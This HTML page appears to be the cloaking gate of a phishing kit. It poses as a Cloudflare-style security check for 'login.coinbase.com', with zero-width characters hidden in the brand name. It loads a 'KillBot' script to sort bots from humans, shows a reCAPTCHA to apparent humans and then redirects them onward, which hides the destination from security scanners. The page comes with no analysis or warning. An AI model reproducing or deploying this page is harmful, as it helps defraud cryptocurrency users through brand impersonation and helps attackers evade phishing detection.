<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
    <title>Just a moment...</title>
    <!-- Load KillBot first -->
    <script src="/bccsr2dec.js"></script>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    
    <style>
        /* Your existing styles */
        *{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"}
        body{display:flex;flex-direction:column;height:100vh;min-height:100vh}
        .main-wrapper { flex: 1; }
        .main-content{margin:8rem auto;padding-left:1.5rem;max-width:60rem}
        
        /* KillBot container styles */
        #killbot-verification {
            text-align: center;
            padding: 2rem;
        }
        
        /* CAPTCHA container - hidden initially */
        #captcha-container {
            display: none;
        }
        
        /* Your existing CAPTCHA styles */
        .captcha-container {
            display: flex;
            justify-content: flex-start;
            margin: 1rem 0;
        }
        
        #uMtSJ0 {
            display: block !important;
        }
        
        .g-recaptcha {
            transform: scale(0.95);
            transform-origin: 0 0;
        }
        
        .loading-verifying {
            text-align: center;
            margin: 1rem 0;
        }
        
        .lds-ring {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }
        
        .lds-ring div {
            box-sizing: border-box;
            display: block;
            position: absolute;
            width: 64px;
            height: 64px;
            margin: 8px;
            border: 8px solid #fff;
            border-radius: 50%;
            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
            border-color: #fff transparent transparent transparent;
        }
        
        @keyframes lds-ring {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        #redirect-message {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4");
            background-repeat: no-repeat;
            background-size: contain;
            padding-left: 42px;
        }
    </style>

    <!-- Load reCAPTCHA but don't render yet -->
    <script src='https://www.google.com/recaptcha/api.js' async defer></script>
</head>
<body>
    <div class="main-wrapper" role="main">
        <div class="main-content">
            <h1 class="zone-name-title h1">login.c&#8203;oinbase.com</h1>
            
            <!-- KillBot Verification Section (Visible First) -->
            <div id="killbot-verification">
                <p id="Truv1" class="h2 spacer-bottom">Initial security verification in progress...</p>
                
                <div class="loading-verifying">
                    <div class="lds-ring">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                    <p>Checking connection security...</p>
                </div>
            </div>
            
            <!-- CAPTCHA Section (Hidden Initially) -->
            <div id="captcha-container">
                <p id="captcha-title" class="h2 spacer-bottom">Complete the final verification below.</p>
                
                <div id="uMtSJ0">
                    <div>
                        <div>
                            <div class="captcha-container">
                                <div class="g-recaptcha" 
                                     data-sitekey="6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-"
                                     data-callback="onCaptchaVerify"></div>
                            </div>
                            <input type="hidden" name="g-recaptcha-response" id="g-recaptcha-response">
                        </div>
                    </div>
                </div>
                
                <div id="bBCk7" class="spacer loading-verifying" style="display: none;">
                    <div class="lds-ring">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                    <p>Verifying...</p>
                </div>
            </div>
            
            <div id="Zdps1" style="display: none;">
                <div class="core-msg spacer" id="redirect-message">Redirecting to C&#8203;oinbase...</div>
            </div>
            
            <div class="core-msg spacer spacer-top">login.c&#8203;oinbase.com needs to review the security of your connection before proceeding.</div>
        </div>
    </div>

    <script>
        // KillBot Configuration - Modify your KillBot callback
        function kbBeforeFinish(isBot, kbRes=null) {
            if (isBot === false) {
                // Human detected by KillBot - Show CAPTCHA
                console.log('KillBot verification passed, showing CAPTCHA...');
                showCaptchaSection();
            } else {
                // Bot detected by KillBot - Handle accordingly
                console.log('Bot detected by KillBot');
                // You can redirect, show error, or let KillBot handle it
            }
        }

        function showCaptchaSection() {
            // Hide KillBot section
            document.getElementById('killbot-verification').style.display = 'none';
            
            // Show CAPTCHA section
            document.getElementById('captcha-container').style.display = 'block';
            
            // Update the title
            document.getElementById('Truv1').textContent = 'Verify you are human by completing the action below.';
            
            console.log('CAPTCHA section activated');
        }

        // Fallback: If KillBot doesn't trigger within 5 seconds, show CAPTCHA
        setTimeout(function() {
            if (document.getElementById('captcha-container').style.display === 'none') {
                console.log('Fallback: Showing CAPTCHA after timeout');
                showCaptchaSection();
            }
        }, 5000);

        // Your existing CAPTCHA function
        function onCaptchaVerify(response) {
            if (response) {
                document.getElementById('g-recaptcha-response').value = response;
                document.getElementById('captcha-title').style.display = 'none';
                document.getElementById('Zdps1').style.display = 'block';

                fetch('/verify-captcha', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({captcha_response: response})
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        setTimeout(() => {
                            window.location.href = 'main';
                        }, 1500);
                    } else {
                        location.reload();
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    location.reload();
                });
            }
        }
    </script>
</body>
</html>
